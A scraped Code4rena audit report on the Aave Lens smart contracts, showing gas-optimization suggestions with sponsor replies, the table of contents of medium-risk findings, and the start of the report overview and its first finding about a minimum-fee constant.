focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Increments can be unchecked</h4>\n<p>In Solidity 0.8+, there’s a default overflow check on unsigned integers. It’s possible to uncheck this in for-loops and save some gas at each iteration, but at the cost of some code readability, as this uncheck cannot be made inline.</p>\n<p><a href=\"https://github.com/ethereum/solidity/issues/10695\">ethereum/solidity#10695</a></p>\n<p>Instances include:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"37\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">core\\modules\\follow\\ApprovalFollowModule.sol:41:        for (uint256 i = 0; i &lt; addresses.length; ++i) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">core\\modules\\follow\\ApprovalFollowModule.sol:66:            for (uint256 i = 0; i &lt; addresses.length; ++i) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">core\\modules\\follow\\ApprovalFollowModule.sol:128:        for (uint256 i = 0; i &lt; toCheck.length; ++i) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">core\\LensHub.sol:541:        for (uint256 i = 0; i &lt; vars.datas.length; ++i) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">libraries\\InteractionLogic.sol:47:        for (uint256 i = 0; i &lt; profileIds.length; ++i) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">libraries\\PublishingLogic.sol:403:        for (uint256 i = 0; i &lt; byteHandle.length; ++i) {</span></span></code></pre>\n<p>The code would go from:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"38\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">for (uint256 i; i &lt; numIterations; ++i) {  </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> // ...  </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}  </span></span></code></pre>\n<p>to:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"39\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">for (uint256 i; i &lt; numIterations;) {  </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> // ...  </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> unchecked { ++i; }  </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}  </span></span></code></pre>\n<p>The risk of overflow is inexistant for a <code>uint256</code> here.</p>\n<h4 id=\"an-arrays-length-should-be-cached-to-save-gas-in-for-loops\" style=\"position:relative;\"><a href=\"#an-arrays-length-should-be-cached-to-save-gas-in-for-loops\" aria-label=\"an arrays length should be cached to save gas in for loops permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>An array’s length should be cached to save gas in for-loops</h4>\n<p>Reading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.</p>\n<p>Caching the array length in the stack saves around 3 gas per iteration.</p>\n<p>Here, I suggest storing the array’s length in a variable before the for-loop, and use it instead:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"40\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">core\\modules\\follow\\ApprovalFollowModule.sol:41:        for (uint256 i = 0; i &lt; addresses.length; ++i) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">core\\modules\\follow\\ApprovalFollowModule.sol:66:            for (uint256 i = 0; i &lt; addresses.length; ++i) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">core\\modules\\follow\\ApprovalFollowModule.sol:128:        for (uint256 i = 0; i &lt; toCheck.length; ++i) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">core\\LensHub.sol:541:        for (uint256 i = 0; i &lt; vars.datas.length; ++i) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">libraries\\InteractionLogic.sol:47:        for (uint256 i = 0; i &lt; profileIds.length; ++i) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">libraries\\PublishingLogic.sol:403:        for (uint256 i = 0; i &lt; byteHandle.length; ++i) {</span></span></code></pre>\n<h3 id=\"arithmetics\" style=\"position:relative;\"><a href=\"#arithmetics\" aria-label=\"arithmetics permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Arithmetics</h3>\n<h4 id=\"shift-right-instead-of-dividing-by-2\" style=\"position:relative;\"><a href=\"#shift-right-instead-of-dividing-by-2\" aria-label=\"shift right instead of dividing by 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Shift Right instead of Dividing by 2</h4>\n<p>A division by 2 can be calculated by shifting one to the right.</p>\n<p>While the <code>DIV</code> opcode uses 5 gas, the <code>SHR</code> opcode only uses 3 gas. Furthermore, Solidity’s division operation also includes a division-by-0 prevention which is bypassed using shifting.</p>\n<p>I suggest replacing <code>/ 2</code> with <code>>> 1</code> here:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"41\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">core\\modules\\ModuleGlobals.sol:109:        if (newTreasuryFee &gt;= BPS_MAX / 2) revert Errors.InitParamsInvalid();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">core\\FollowNFT.sol:134:            uint256 center = upper - (upper - lower) / 2;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">core\\FollowNFT.sol:176:            uint256 center = upper - (upper - lower) / 2;</span></span></code></pre>\n<h3 id=\"errors\" style=\"position:relative;\"><a href=\"#errors\" aria-label=\"errors permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Errors</h3>\n<h4 id=\"use-custom-errors-instead-of-revert-strings-to-save-gas\" style=\"position:relative;\"><a href=\"#use-custom-errors-instead-of-revert-strings-to-save-gas\" aria-label=\"use custom errors instead of revert strings to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Use Custom Errors instead of Revert Strings to save Gas</h4>\n<p>I’m quite certain that the sponsor is aware of this optimization, as the library <code>Errors</code> contains a lot of custom errors. Therefore, I won’t explain it (suffice to say, they are cheaper than require statements + revert strings).</p>\n<p>The finding here is that the contracts <code>ERC721Enumerable</code> and <code>ERC721Time</code> don’t benefit from this practice:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"42\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">core\\base\\ERC721Enumerable.sol:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  53:         require(index &lt; ERC721Time.balanceOf(owner), &#39;ERC721Enumerable: owner index out of bounds&#39;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  68:         require(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  69              index &lt; ERC721Enumerable.totalSupply(),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  70              &#39;ERC721Enumerable: global index out of bounds&#39;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  71          );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">core\\base\\ERC721Time.sol:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">   77:         require(owner != address(0), &#39;ERC721: balance query for the zero address&#39;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">   86:         require(owner != address(0), &#39;ERC721: owner query for nonexistent token&#39;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">   95:         require(mintTimestamp != 0, &#39;ERC721: mint timestamp query for nonexistent token&#39;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  109:         require(_exists(tokenId), &#39;ERC721: token data query for nonexistent token&#39;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  131:         require(_exists(tokenId), &#39;ERC721Metadata: URI query for nonexistent token&#39;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  152:         require(to != owner, &#39;ERC721: approval to current owner&#39;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  154:         require(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  155              _msgSender() == owner || isApprovedForAll(owner, _msgSender()),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  156              &#39;ERC721: approve caller is not owner nor approved for all&#39;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  157          );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  166:         require(_exists(tokenId), &#39;ERC721: approved query for nonexistent token&#39;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  175:         require(operator != _msgSender(), &#39;ERC721: approve to caller&#39;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  202:         require(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  203              _isApprovedOrOwner(_msgSender(), tokenId),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  204              &#39;ERC721: transfer caller is not owner nor approved&#39;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  205          );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  230:         require(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  231              _isApprovedOrOwner(_msgSender(), tokenId),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  232              &#39;ERC721: transfer caller is not owner nor approved&#39;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  233          );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  262:         require(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  263              _checkOnERC721Received(from, to, tokenId, _data),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  264              &#39;ERC721: transfer to non ERC721Receiver implementer&#39;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  265          );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  293:         require(_exists(tokenId), &#39;ERC721: operator query for nonexistent token&#39;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  324:         require(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  325              _checkOnERC721Received(address(0), to, tokenId, _data),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  326              &#39;ERC721: transfer to non ERC721Receiver implementer&#39;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  327          );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  343:         require(to != address(0), &#39;ERC721: mint to the zero address&#39;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  344:         require(!_exists(tokenId), &#39;ERC721: token already minted&#39;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  395:         require(ERC721Time.ownerOf(tokenId) == from, &#39;ERC721: transfer of token that is not own&#39;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  396:         require(to != address(0), &#39;ERC721: transfer to the zero address&#39;);</span></span></code></pre>\n<p>I suggest using custom errors in <code>ERC721Enumerable</code> and <code>ERC721Time</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/47#issuecomment-1075423322\">Zer0dot (Aave Lens) commented</a>:</strong></p>\n<blockquote>\n<p>Okay this is possibly the best gas report I have ever seen. Huge props to Dravee!</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/47#issuecomment-1076895010\">Zer0dot (Aave Lens) commented</a>:</strong></p>\n<blockquote>\n<p>Implementing a whole lot of this in a new PR, here are some notes:</p>\n<ol>\n<li>Inlining the handle hash computation increased code size by ~3 bytes and increased gas by 4, so we’re not implementing that.</li>\n<li>Calldata instead of memory is valid but the reason we’re doing this is to avoid stack too deep errors, follow NFT URI thing is a good catch though, and valid for the profile image URI too!</li>\n<li>The <code>= 0</code> initialization is there for clarity and I believe it’s handled by the optimizer.</li>\n</ol>\n<p>Will write more, I’m currently at the unchecked increment section, which is valid. Anyway, C4 give this gigachad a medal.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/47#issuecomment-1077737245\">Zer0dot (Aave Lens) commented</a>:</strong></p>\n<blockquote>\n<p>Included unchecked increments, and cached array lengths (where possible) too!</p>\n<p>Unchecked increments: <a href=\"https://github.com/aave/lens-protocol/commit/37ab8cea46ec6cf1f1a20dd4f5d720c49da06dc2\">aave/lens-protocol@37ab8ce</a><br>\nArray length caching: <a href=\"https://github.com/aave/lens-protocol/commit/a698476590fb58eb7f698079714cba31e9d10a5e\">aave/lens-protocol@a698476</a><br></p>\n<p>The SHR sacrifices readability too much, though it’s still valid. Lastly the custom errors I would say are not valid since that’s just how ERC721 is built, we don’t want to stray away from the standard, even in revert messages as much as possible.</p>\n<p>Overall this is a fantastic report!</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/47#issuecomment-1084955877\">Zer0dot (Aave Lens) commented</a>:</strong></p>\n<blockquote>\n<p>PSA: The happy path short-circuiting is only partly valid in that it saves a minor amount of gas (2-3 opcodes) since even the “sad path” is evaluated lazily, if the first condition evaluates to false, the second condition is not evaluated.</p>\n</blockquote>\n<hr>\n<h1 id=\"disclosures\" style=\"position:relative;\"><a href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disclosures</h1>\n<p>C4 is an open organization governed by participants in the community.</p>\n<p>C4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>\n<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>",
  "toc": "<ul>\n<li>\n<p><a href=\"#overview\">Overview</a></p>\n<ul>\n<li><a href=\"#about-c4\">About C4</a></li>\n<li><a href=\"#wardens\">Wardens</a></li>\n</ul>\n</li>\n<li><a href=\"#summary\">Summary</a></li>\n<li><a href=\"#scope\">Scope</a></li>\n<li><a href=\"#severity-criteria\">Severity Criteria</a></li>\n<li>\n<p><a href=\"#medium-risk-findings-13\">Medium Risk Findings (13)</a></p>\n<ul>\n<li><a href=\"#m-01-basis-points-constant-bps_max-is-used-as-minimal-fee-amount-requirement\">[M-01] Basis points constant BPS_MAX is used as minimal fee amount requirement</a></li>\n<li><a href=\"#m-02-inappropriate-handling-of-referralfee-makes-collecting-mirror-fails-without-error-when-referrerprofileid-is-burned\">[M-02] Inappropriate handling of <code>referralFee</code> makes collecting Mirror fails without error when <code>referrerProfileId</code> is burned</a></li>\n<li><a href=\"#m-03-profile-creation-can-be-frontrun\">[M-03] Profile creation can be frontrun</a></li>\n<li><a href=\"#m-04-name-squatting\">[M-04] Name squatting</a></li>\n<li><a href=\"#m-05-cashback-on-referral\">[M-05] Cashback on referral</a></li>\n<li><a href=\"#m-06-imprecise-management-of-users-allowance-allows-the-admin-of-the-upgradeable-proxy-contract-to-rug-users\">[M-06] Imprecise management of users’ allowance allows the admin of the upgradeable proxy contract to rug users</a></li>\n<li><a href=\"#m-07-its-possible-to-follow-deleted-profiles\">[M-07] It’s possible to follow deleted profiles</a></li>\n<li><a href=\"#m-08-missing-whennotpaused\">[M-08] Missing whenNotPaused</a></li>\n<li><a href=\"#m-09-collect-modules-can-fail-on-zero-amount-transfers-if-treasury-fee-is-set-to-zero\">[M-09] Collect modules can fail on zero amount transfers if treasury fee is set to zero</a></li>\n<li><a href=\"#m-10-zero-collection-module-can-be-whitelisted-and-set-to-a-post-which-will-then-revert-all-collects-and-mirrors-with-publicationdoesnotexist\">[M-10] Zero collection module can be whitelisted and set to a post, which will then revert all collects and mirrors with `PublicationDoesNotExist</a></li>\n<li><a href=\"#m-11-approvals-not-cleared-when-transferring-profile\">[M-11] Approvals not cleared when transferring profile</a></li>\n<li><a href=\"#m-12-ineffective-whitelist\">[M-12] Ineffective Whitelist</a></li>\n<li><a href=\"#m-13-reentrancy-allows-commenter-to-overwrite-own-comments\">[M-13] Reentrancy allows commenter to overwrite own comments</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#low-risk-and-non-critical-issues\">Low Risk and Non-Critical Issues</a></p>\n<ul>\n<li><a href=\"#l-01-approvalfollowmodulesol-lack-of-transfer-check-make-it-possible-for-anyone-to-become-follower-without-approved-by-the-profile-owner\">L-01 <code>ApprovalFollowModule.sol</code> lack of transfer check make it possible for anyone to become follower without approved by the profile owner</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#gas-optimizations\">Gas Optimizations</a></p>\n<ul>\n<li><a href=\"#table-of-contents\">Table of Contents</a></li>\n<li><a href=\"#foreword\">Foreword</a></li>\n<li><a href=\"#file-follownftsol\">File: FollowNFT.sol</a></li>\n<li><a href=\"#file-lenshubsol\">File: LensHub.sol</a></li>\n<li><a href=\"#file-lensnftbasesol\">File: LensNFTBase.sol</a></li>\n<li><a href=\"#file-publishinglogicsol\">File: PublishingLogic.sol</a></li>\n<li><a href=\"#general-recommendations\">General recommendations</a></li>\n</ul>\n</li>\n<li><a href=\"#disclosures\">Disclosures</a></li>\n</ul>",
  "md": "\n# Overview\n\n## About C4\n\nCode4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.\n\nA C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.\n\nDuring the audit contest outlined in this document, C4 conducted an analysis of the Aave Lens smart contract system written in Solidity. The audit contest took place between February 10—February 16 2022.\n\n## Wardens\n\n23 Wardens contributed reports to the Aave Lens contest:\n\n  1. [cmichel](https://twitter.com/cmichelio)\n  1. hyh\n  1. [danb](https://twitter.com/danbinnun)\n  1. WatchPug ([jtp](https://github.com/jack-the-pug) and [ming](https://github.com/mingwatch))\n  1. IllIllI\n  1. cccz\n  1. [Dravee](https://twitter.com/JustDravee)\n  1. [csanuragjain](https://twitter.com/csanuragjain)\n  1. [gzeon](https://twitter.com/gzeon)\n  1. [pauliax](https://twitter.com/SolidityDev)\n  1. [defsec](https://twitter.com/defsec_)\n  1. 0x0x0x\n  1. Jujic\n  1. hubble (ksk2345 and shri4net)\n  1. 0x1f8b\n  1. sikorico\n  1. 0xwags\n  1. kenta\n  1. nahnah\n  1. d4rk\n  1. [rfa](https://www.instagram.com/riyan_rfa/)\n\nThis contest was judged by [0xleastwood](https://twitter.com/liam_eastwood13).\n\nFinal report assembled by [liveactionllama](https://twitter.com/liveactionllama).\n\n# Summary\n\nThe C4 analysis yielded an aggregated total of 13 unique vulnerabilities. Of these vulnerabilities, 0 received a risk rating in the category of HIGH severity and 13 received a risk rating in the category of MEDIUM severity.\n\nAdditionally, C4 analysis included 14 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 12 reports recommending gas optimizations.\n\nAll of the issues presented here are linked back to their original finding.\n\n# Scope\n\nThe code under review can be found within the [C4 Aave Lens contest repository](https://github.com/code-423n4/2022-02-aave-lens), and is composed of 39 smart contracts written in the Solidity programming language and includes 3,432 lines of Solidity code.\n\n# Severity Criteria\n\nC4 assesses the severity of disclosed vulnerabilities according to a methodology based on [OWASP standards](https://owasp.org/www-community/OWASP_Risk_Rating_Methodology).\n\nVulnerabilities are divided into three primary risk categories: high, medium, and low/non-critical.\n\nHigh-level considerations for vulnerabilities span the following key areas when conducting assessments:\n\n- Malicious Input Handling\n- Escalation of privileges\n- Arithmetic\n- Gas use\n\nFurther information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com).\n\n# Medium Risk Findings (13)\n## [[M-01] Basis points constant BPS_MAX is used as minimal fee amount requirement](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/46)\n_Submitted by hyh, also found by cmichel_\n\nBase fee modules require minimum fixed fee amount to be at least BPS_MAX, which is hard coded to be 10000.\n\nThis turns out to be a functionality restricting requirement for some currencies.\n\nFor example, WBTC (<https://etherscan.io/token/0x2260fac5e5542a773aa44fbcfedf7c193bc2c599>, #10 in ERC20 token rankings), has decimals of 8 and current market rate around \\$40k, i.e. if you want to use any WBTC based collect fee, it has to be at least \\$4 per collect or fee enabled follow.\n\nTether and USDC (<https://etherscan.io/token/0xdac17f958d2ee523a2206206994597c13d831ec7> and <https://etherscan.io/token/0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48>, #1 and #3) have decimals of 6, so it is at least \\$0.01 per collect/follow, which also looks a bit tight for a hard floor minimum.\n\n### Proof of Concept\n\nBPS_MAX is a system wide constant, now 10000:\n\n[FeeModuleBase.sol#L17](https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/FeeModuleBase.sol#L17)<br>\n\n[ModuleGlobals.sol#L20](https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/ModuleGlobals.sol#L20)<br>\n\nThis is correct for any fees defined in basis point terms.\n\nWhen it comes to the nominal amount, 10000 can be too loose or too tight depending on a currency used, as there can be various combinations of decimals and market rates.\n\nThe following base collect module implementations require fee amount to be at least BPS_MAX (initialization reverts when amount < BPS_MAX):\n\nAll collect module implementations use the same check:\n\nFeeCollectModule: 